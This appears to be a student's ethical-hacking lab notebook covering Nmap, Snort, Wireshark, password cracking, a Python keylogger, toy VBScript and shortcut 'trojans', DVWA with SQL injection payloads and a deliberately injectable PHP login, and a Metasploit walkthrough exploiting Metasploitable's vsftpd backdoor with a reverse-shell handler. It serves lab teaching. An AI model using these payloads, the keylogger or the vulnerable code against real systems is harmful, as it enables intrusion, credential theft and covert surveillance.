## Practical 3 — Port & Network Scanning, Snort, Wireshark

### A. Port Scanning (Nmap)

* Scan open ports:

  ```
  nmap --open 127.0.0.1
  ```
* Scan single port:

  ```
  nmap -p 80 127.0.0.1
  ```
* Scan a range of ports:

  ```
  nmap -p 1-200 127.0.0.1
  ```
* Scan entire port range:

  ```
  nmap -p 1-65535 127.0.0.1
  ```
* Fast scan (top 100):

  ```
  nmap -F 127.0.0.1
  ```

### B. Network Scanning (Nmap)

* Ping scan (list live hosts):

  ```
  nmap -sn 192.168.1.0
  ```
* ARP / host scan:

  ```
  nmap -sP 192.168.1.0/24
  ```
* DNS resolution:

  ```
  nmap -sL 192.168.1.0
  ```
* OS detection:

  ```
  nmap -O 192.168.1.0
  ```
* Extra commands:

  ```
  nmap -iL filename.txt
  nmap -A 192.168.1.0
  nmap --traceroute 8.8.8.8
  ```

### C. Snort (IDS)

* Verify version:

  ```
  snort -V
  ```
* List adapters:

  ```
  snort -W
  ```
* Run (sniffer):

  ```
  snort -i 6 -A console
  ```
* Run with config:

  ```
  snort -c C:\Snort\etc\snort.conf -i 6 -A console
  ```

**Example `snort.conf` snippet** (Windows local testing):

```
ipvar HOME_NET 10.119.154.0/24
ipvar EXTERNAL_NET any
var RULE_PATH C:\Snort\rules
var LOG_PATH C:\Snort\log
preprocessor frag3_global: max_frags 65536
preprocessor frag3_engine: policy windows
preprocessor stream5_global: track_tcp yes
preprocessor stream5_tcp: policy windows
output alert_fast: alert.fast
include $RULE_PATH/local.rules
```

**local.rules examples:**

```
alert icmp any any -> $HOME_NET any (msg:"ICMP Ping Detected"; sid:1000001;)
alert tcp any any -> any 80 (msg:"HTTP Traffic Detected"; flow:to_server,established; sid:1000002;)
alert tcp any any -> any any (flags:S; msg:"TCP SYN Scan Detected"; threshold:type both, track by_src, count 5, seconds 60; sid:1000003;)
```

**Test commands:**

```
ping 10.1.5.85
nmap -sS 10.1.5.85
```

### D. Wireshark (Packet capture)

* Capture filter example:

  ```
  tcp port 80
  ```
* Display filters:

  ```
  ip.src == 192.168.1.5
  http
  icmp
  tcp.flags.syn == 1
  ```
* Steps: Start capture → generate traffic (e.g., visit `http://www.techpanda.org`) → stop capture → inspect POST/HTTP packets.

---

## Practical 4 — Password Cracking, Dictionary Attack, DoS, ARP, Tools

### A. Password Cracking

* MD5 generator: use [https://www.md5hashgenerator.com/](https://www.md5hashgenerator.com/)

  * `Admin12345` → `e66055e8e308770492a44bf16e875127`
  * `Ethical@#$%Hacking` → `698543190dc248f71d96e5a4f1dd0bd2`
* CrackStation: [https://crackstation.net/](https://crackstation.net/)

### B. Dictionary Attack (Python)

* Script (`dictattack.py`):

  ```python
  import hashlib
  flag = 0
  p_hash = input("Enter MD5 hash: ")
  dictionary = input("Enter dictionary filename: ")
  try:
      password_file = open(dictionary, "r")
  except FileNotFoundError:
      print("No file found")
      quit()
  for word in password_file:
      enc_word = word.strip().encode('utf-8')
      digest = hashlib.md5(enc_word).hexdigest()
      if digest == p_hash:
          print("Password has been found")
          print("Password is:", word.strip())
          flag = 1
          break
  if flag == 0:
      print("No password found")
  ```
* Run:

  ```
  python dictattack.py
  ```

### C. Encrypt / Decrypt Passwords (online)

* DNSChecker: [https://dnschecker.org/password-encryption-utility.php](https://dnschecker.org/password-encryption-utility.php)
* Hashes.com: [https://hashes.com/en/decrypt/hash](https://hashes.com/en/decrypt/hash)

### D. DoS (theory)

* Ping of Death, SYN flood, Smurf — no active commands provided (explain only).

### E. ARP Poisoning (Cain & Abel workflow)

* GUI steps: Sniffer → select interface → scan hosts → APR tab → pair victim + gateway → start poisoning → capture.

### F. Network commands

```
ipconfig
ipconfig /all
ping google.com
tracert google.com
netstat -an
```

### G. Steganography (S-Tools)

* Use S-Tools GUI: hide `ME.txt` inside `img1.bmp` → produce `hidden data.bmp` → reveal by entering password.

---

## Practical 5 — Keylogger, Virus, Trojan (Windows)

### A. Keylogger (Python)

* Install:

  ```
  pip install pynput
  ```
* Keylogger code (writes to `keyLog.txt`):

  ```python
  from pynput.keyboard import Key, Listener
  import logging
  import os
  log_dir = r"E:/Users/mca24106/Downloads/Keylogger"
  log_path = os.path.join(log_dir, "keyLog.txt")
  logging.basicConfig(filename=log_path, level=logging.DEBUG, format='%(asctime)s: %(message)s')
  def on_press(key):
      logging.info(str(key))
  with Listener(on_press=on_press) as listener:
      listener.join()
  ```

> **Ethical note:** Keyloggers and malware code are provided for educational understanding only. Do not deploy on systems without explicit, lawful permission.

### B. Simple message virus (example VBScript loop)

```vbscript
set x=wscript.createobject("wscript.shell")
do
  wscript.sleep 100
  x.sendkeys"{CAPSLOCK}"
  x.sendkeys"{NUMLOCK}"
  x.sendkeys"I am a Virus"
  x.sendkeys" {SCROLLLOCK}"
loop
```

### C. Trojan via shortcut

* Create shortcut with command:

  ```
  shutdown -s -t 50 -c "Shutdown the machine"
  ```
* Change icon to disguise.

---

## Practical 7 — Ceaser Ciphers (CrypTool)

```java
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.util.Scanner;

public class CaesarCipher {
    static Scanner sc = new Scanner(System.in);
    static BufferedReader br = new BufferedReader(new InputStreamReader(System.in));

    public static void main(String[] args) throws IOException {
        System.out.print("Enter any String: ");
        String str = br.readLine();
        System.out.print("Enter the Key (integer): ");
        int key = sc.nextInt();
        String encrypted = encrypt(str, key);
        System.out.println("\nEncrypted String is: " + encrypted);
        String decrypted = decrypt(encrypted, key);
        System.out.println("Decrypted String is: " + decrypted);
    }

    static String encrypt(String str, int key) {
        StringBuilder encrypted = new StringBuilder();
        int shift = key % 26;
        for (int i = 0; i < str.length(); i++) {
            char c = str.charAt(i);
            if (Character.isUpperCase(c)) {
                char ch = (char) (c + shift);
                if (ch > 'Z') ch = (char) (ch - 26);
                encrypted.append(ch);
            } else if (Character.isLowerCase(c)) {
                char ch = (char) (c + shift);
                if (ch > 'z') ch = (char) (ch - 26);
                encrypted.append(ch);
            } else encrypted.append(c);
        }
        return encrypted.toString();
    }

    static String decrypt(String str, int key) {
        StringBuilder decrypted = new StringBuilder();
        int shift = key % 26;
        for (int i = 0; i < str.length(); i++) {
            char c = str.charAt(i);
            if (Character.isUpperCase(c)) {
                char ch = (char) (c - shift);
                if (ch < 'A') ch = (char) (ch + 26);
                decrypted.append(ch);
            } else if (Character.isLowerCase(c)) {
                char ch = (char) (c - shift);
                if (ch < 'a') ch = (char) (ch + 26);
                decrypted.append(ch);
            } else decrypted.append(c);
        }
        return decrypted.toString();
    }
}
```

---

## Practical 6 — DVWA, LFI/RFI, SQLi, Session Hijacking (summary & commands)

### DVWA setup (clone into XAMPP htdocs)

```
cd C:/xampp/htdocs
git clone https://github.com/digininja/DVWA.git
```

Start XAMPP → Apache + MySQL
Open `C:\xampp\htdocs\DVWA` in VS Code
Rename `config/config.inc.php.dist` → `config/config.inc.php` and set:

```
$_DVWA['db_user'] = 'root';
$_DVWA['db_password'] = '';
```

Visit:

```
http://localhost/DVWA/setup.php
```

Click **Create / Reset Database** → Login (admin/password) → Set security to **Low**

### Apache & PHP changes (for RFI testing)

Add to `httpd.conf` or `httpd-xampp.conf`:

```apache
<Directory "C:/xampp/htdocs">
    php_admin_value allow_url_include 1
    php_admin_value allow_url_fopen 1
</Directory>
```

In `C:\xampp\php\php.ini`:

```
allow_url_include = On
```

Restart Apache.

### LFI/RFI testing

Open file inclusion module:

```
http://localhost/DVWA-master/vulnerabilities/fi/?page=include.php
```

Include local file:

```
?page=http://localhost/sqlinjection/login.php
```

Include remote file (RFI demo):

```
?page=http://www.google.com
```

### Create basic login files (for testing LFI)

* Place `login.php`, `index.php`, `logout.php` in `C:\xampp\htdocs\sqlinjection`
### **login.php**

```php
<?php
$message="";
if(count($_POST)>0) {
    $con = mysqli_connect('127.0.0.1','root','', 'dvwa') or die('Unable To connect');
    $result = mysqli_query($con,"SELECT * FROM login_user WHERE user_name='" .
        $_POST["user_name"] . "' and password = '". $_POST["password"]."'");
    $row  = mysqli_fetch_array($result);
    if(is_array($row)) {
        $_SESSION["id"] = $row['id'];
        $_SESSION["name"] = $row['name'];
    } else {
        $message = "Invalid Username or Password!";
    }
}
if(isset($_SESSION["id"])) {
    header("Location:index.php");
}
?>
<html>
<head><title>User Login</title></head>
<body>
<form method="post" align="center">
<div><?php if($message!="") { echo $message; } ?></div>
<h3>Enter Login Details</h3>
Username: <input type="text" name="user_name"><br>
Password: <input type="password" name="password"><br><br>
<input type="submit" value="Submit">
</form>
</body>
</html>
```

### **index.php**

```php
<?php session_start(); ?>
<!doctype html>
<html>
<head><meta charset="utf-8"><title>User Dashboard</title></head>
<body>
<?php
if (isset($_SESSION["name"])) {
    echo "<center><h1>Welcome " . htmlspecialchars($_SESSION["name"]) . "</h1>";
    echo '<p><a href="logout.php">Logout</a></p></center>';
} else {
    echo "<h1>Please login first.</h1>";
}
?>
</body>
</html>
```

### **logout.php**

```php
<?php
session_start();
$_SESSION = array();
session_destroy();
header("Location: login.php");
exit;
?>
```

### SQL (sample table + inserts)

```sql
CREATE TABLE login_user (
  id INT AUTO_INCREMENT PRIMARY KEY,
  user_name VARCHAR(50),
  password VARCHAR(255),
  name VARCHAR(100)
);
INSERT INTO login_user (user_name, password, name)
VALUES ('admin', 'admin123', 'Admin User'),
       ('neha', 'neha123', 'Neha Yadav');
```

### SQL Injection payloads & tests

* Bypass login:

```
Username: ' OR 1=1--
Password: anything
```

* Order-by to find column count:

```
1' order by 1#
1' order by 2#
1' order by 3#   -- triggers error if only 2 columns
```

* UNION-based data extraction examples:

```
1' or '1'='1
1' UNION select user, password from users#
1' UNION select null, version()#
1' UNION select null, user()#
1' UNION select null, database()#
1' UNION select null, table_name from information_schema.tables#
1' UNION select null, concat(id,0x0a,user_name,0x0a,password) from users.user_login#
```

### Session Hijacking (manual cookie edit)

* Tools: Wireshark, EditThisCookie
* Steps: Capture PHPSESSID for Admin, then replace another user's PHPSESSID with Admin's value using EditThisCookie → refresh → gain access as Admin.

---


1. Basic Google Operators
cache: – View Google’s Cached Version of a Page
Usage:

cache:<URL>

Example:

cache:irs.gov

(Shows Google’s cached version of the US Internal Revenue Service home page.)

info: (or id:) – Get Info About a Website
Usage:

info:<URL>

Example:

info:theonion.com

(Displays Google’s summary, similar pages, cached version, etc.)

related: – Find Similar/Related Websites
Usage:

related:<URL>

Example:

related:healthfinder.gov

(Shows sites related to Healthfinder.)

2. Restrict Search Based on Location of Terms
Operator	Meaning	Example
allinanchor:	All query words must appear in anchor text	allinanchor:useful parenting sites
inanchor:	Terms appear in anchor text	restaurants Portland inanchor:kid-friendly
allintext:	All query words must appear in body text	allintext:ingredients cilantro chicken lime
intext:	The term must appear in the text	Dan Shugar intext:Powerlight
allintitle:	All words appear in the title	allintitle: Google Advanced Operators
intitle:	Terms must appear in the title	movies comedy intitle:top ten
allinurl:	All terms must appear in URL	allinurl:pez faq
inurl:	Terms must appear in the URL	pharmaceutical inurl:investor
3. Google Groups Search Operators
Operator	Meaning	Example
author:	Find messages by an author	flvina author:Hamish author:Reid
group:	Search inside a specific newsgroup	ivan doig group:rec.arts.books
insubject:	Terms must appear in subject	insubject:"crazy quilts"
4. Google News Search Operators
Operator	Meaning	Example
location:	News from a specific region	queen location:uk
source:	Specify news outlet	peace source:ha_aretz
Laws under IT Act 2000 and IT Amendment Act 2008
Introduction
The Information Technology (IT) Act, 2000, provides the legal framework for e-governance, digital communication, and cybercrime regulation in India. It recognizes electronic records and digital signatures as legally valid. The IT (Amendment) Act, 2008, strengthened the original law by including data protection, privacy, and cyber terrorism provisions. Together, they form the foundation of cyber law in India, ensuring responsible use of technology.

Key Sections of the IT Act
Section 43 - Damage to Computer, Computer System, etc.
Description: Addresses unauthorized access, data theft, or damage to computer systems and networks.
Case: Bank of America Data Breach (2011) — sensitive data of nearly 90 million customers was exposed due to a stolen laptop.
Penalty: Imprisonment up to 3 years and/or fine up to ₹5 lakh.
Preventive Measures: Encrypt sensitive data, restrict access, implement cybersecurity policies.
Section 65 - Tampering with Computer Source Documents
Description: Intentional alteration, destruction, or concealment of computer source code.
Case: Kevin Mitnick accessed company systems, altered source codes, and stole confidential data.
Penalty: Imprisonment up to 3 years and/or fine.
Preventive Measures: Use source control systems, regular audits, strong authentication.
Section 66A - Sending Offensive Messages (Struck down in 2015)
Description: Penalized sending offensive or threatening electronic messages.
Case: Raja Ram Pal (2012) — accused of sending offensive political emails.
Penalty: Imprisonment up to 3 years and/or fine.
Preventive Measures: Promote responsible online behaviour.
Section 66B - Dishonestly Receiving Stolen Computer Resource
Description: Punishes receiving or using stolen computer resources or data.
Case: Orkut Data Theft Case (2010) — stolen user data sold online for scams.
Penalty: Imprisonment up to 3 years and/or fine up to ₹1 lakh.
Preventive Measures: Verify data sources and ensure secure storage.
Section 66C - Identity Theft / Cyber Extortion
Description: Fraudulent use of another person’s digital identity.
Case: Unocoin Cyber Extortion Case — hackers accessed crypto wallets and demanded ransom.
Penalty: Imprisonment up to 7 years and fine.
Preventive Measures: Use two-factor authentication, secure transactions.
Section 66D - Cheating by Personation Using Computer Resource
Description: Online impersonation or fraud.
Case: Krrish 3 Piracy Case — illegal distribution of the movie through fake websites.
Penalty: Imprisonment up to 7 years and fine.
Preventive Measures: Digital rights management (DRM) and anti-piracy awareness.
Section 66E - Violation of Privacy / Video Voyeurism
Description: Capturing or transmitting private images without consent.
Case: 2015 trial room recording incident — leaked videos sparked public outrage.
Penalty: Imprisonment up to 3 years and/or fine up to ₹2 lakh.
Preventive Measures: Surveillance only in public areas, privacy awareness.
Section 66F - Cyber Terrorism
Description: Cyber activities threatening national security.
Case: Operation Aurora (2009) — hackers targeted Indian and U.S. government systems.
Penalty: Imprisonment for life.
Preventive Measures: Strengthen national cybersecurity and intelligence systems.
Section 67A - Publishing or Transmitting Obscene Material
Description: Prohibits sexually explicit content online.
Case: TV channel penalized for airing explicit content.
Penalty: Imprisonment up to 7 years and fine up to ₹10 lakh.
Preventive Measures: Content moderation and adherence to cyber ethics.
Section 67B - Child Pornography / Abetment to Obscene Acts
Description: Punishes content involving minors.
Case: Tubemate App Case — app enabled illegal downloading of obscene videos.
Penalty: Imprisonment up to 7 years and/or fine.
Preventive Measures: Monitor online content and enforce child protection.
Section 71 - Misuse of Personal Information
Description: Misuse of personal data collected for legitimate purposes.
Case: Aadhaar Data Leak — exposed sensitive citizen information.
Penalty: Imprisonment up to 7 years and fine.
Preventive Measures: Strong encryption, limited access, security checks.
Section 72 - Breach of Confidentiality and Privacy
Description: Unauthorized disclosure of confidential data.
Case: Telecom company employees leaked customer details.
Penalty: Imprisonment up to 7 years and/or fine.
Preventive Measures: NDAs, monitor employee access.
Section 73 - Publishing False Digital Signatures
Description: Creating or using false digital signatures.
Case: Fake digital certificates used in fraudulent finance transactions.
Penalty: Imprisonment up to 2 years and/or fine up to ₹1 lakh.
Preventive Measures: Verify digital signatures and secure private keys.
Section 74 - Publication for Fraudulent Purpose
Description: Use of fraudulent digital certificates or documents.
Case: Corporate fraud involving forged electronic certificates.
Penalty: Imprisonment up to 7 years and/or fine.
Preventive Measures: Validate documents and maintain audit trails.
Conclusion
Cyber laws regulate online behaviour and protect individuals, organizations, and governments from digital threats. The IT Act 2000 and its 2008 amendment strengthen India’s cyber legal framework. Awareness, compliance, and cybersecurity best practices are essential for a safer digital ecosystem.

8 – Penetration Testing Using Metasploit & Metasploitable
1. Objective
Perform safe and ethical penetration testing on Metasploitable VM.
Use Metasploit Framework to discover, exploit, and post‑exploit vulnerabilities.
Document findings, risks, and mitigation steps.
Target VM: Metasploitable2 (default credentials: msfadmin:msfadmin). Tools: Metasploit, Nmap, Netcat, Nikto, SMB tools, enum4linux. Environment must be isolated (Host‑Only or NAT).

2. Rules of Engagement
Target only your own lab VMs.
No testing on external networks.
Follow proper ethical hacking guidelines.
3. Lab Setup
Attacker Machine
Kali Linux (Metasploit preinstalled) OR Linux with Metasploit installed.
Target
Metasploitable2 VM (in VirtualBox or VMware).
Ensure:

Both VMs are on same internal/host‑only network.
Metasploitable IP reachable (e.g., 192.168.56.101).
4. Penetration Testing Methodology
1️⃣ Reconnaissance (Nmap)
Discover open ports & OS:

nmap -sS -sV -O -p- -T4 <target_ip>

Example:

nmap -sS -sV -O -p- -T4 192.168.56.101

2️⃣ Enumeration
Use tools to enumerate services:

nikto -h <target_ip>
smbclient -L //<target_ip>/
enum4linux <target_ip>

3️⃣ Metasploit Module Selection
Start Metasploit:

sudo msfconsole

Search for exploit modules:

search vsftpd
search samba
search tomcat

4️⃣ Exploitation
General MSF exploitation workflow:

use <module>
show options
set RHOSTS <target_ip>
set RPORT <port>
set PAYLOAD <payload>
set LHOST <attacker_ip>
exploit

5️⃣ Post‑Exploitation
Once Meterpreter shell obtained:

getuid
sysinfo
ls
cat /etc/passwd

Privilege escalation if possible.

6️⃣ Reporting
Include:

Commands used
Screenshots
Shell outputs
Risk level
Fix recommendations
5. Example Command Log (Copy‑Paste Ready)
sudo msfconsole
nmap -sS -sV -O -p- -T4 192.168.56.101

msf > search vsftpd
msf > use exploit/unix/ftp/vsftpd_234_backdoor
msf exploit(vsftpd_234_backdoor) > show options
msf exploit(vsftpd_234_backdoor) > set RHOSTS 192.168.56.101
msf exploit(vsftpd_234_backdoor) > set RPORT 21
msf exploit(vsftpd_234_backdoor) > set LHOST 192.168.56.1
msf exploit(vsftpd_234_backdoor) > set PAYLOAD cmd/unix/interact
msf exploit(vsftpd_234_backdoor) > exploit

msf > use auxiliary/scanner/http/title
msf auxiliary(scanner/http/title) > set RHOSTS 192.168.56.101
msf auxiliary(scanner/http/title) > run

msf > use exploit/multi/handler
msf exploit(multi/handler) > set PAYLOAD linux/x86/meterpreter/reverse_tcp
msf exploit(multi/handler) > set LHOST 192.168.56.1
msf exploit(multi/handler) > exploit -j

6. Findings (Sample Table)
ID	Vulnerability	Service	Impact	Evidence	Severity
1	Default credentials (msfadmin)	SSH	Unauthorized access	ssh msfadmin@target	Medium
2	vsftpd 2.3.4 Backdoor	FTP 21	Remote Command Execution	Metasploit shell	High
3	Outdated Samba	SMB	Info leakage / RCE	smbclient -L + MSF modules	High
4	Vulnerable web apps	HTTP	Directory traversal / SQLi	Nikto results	Medium
7. Risk Ratings & Recommendations
High‑Risk Issues (RCE, weak creds)
Patch/update services.
Remove default accounts.
Disable unneeded services (FTP, Telnet).
Medium‑Risk Issues
Apply strong authentication.
Implement firewall segmentation.
General Security Fixes
Apply OS + service updates.
Enforce password policies.
Enable monitoring / IDS.
8. Executive Summary
A penetration test was conducted against Metasploitable using Metasploit. Multiple critical vulnerabilities were exploited, including a vsftpd backdoor providing a remote shell. This environment is intentionally vulnerable for training, but the findings reflect real‑world security failures such as outdated services, weak credentials, and misconfiguration.

9. Appendix – Evidence Collection
Include in your final submission:

Nmap scan results

Metasploit console logs

Screenshots of:

Successful exploits
Meterpreter session
Privilege escalation
File extraction (e.g., /etc/passwd)
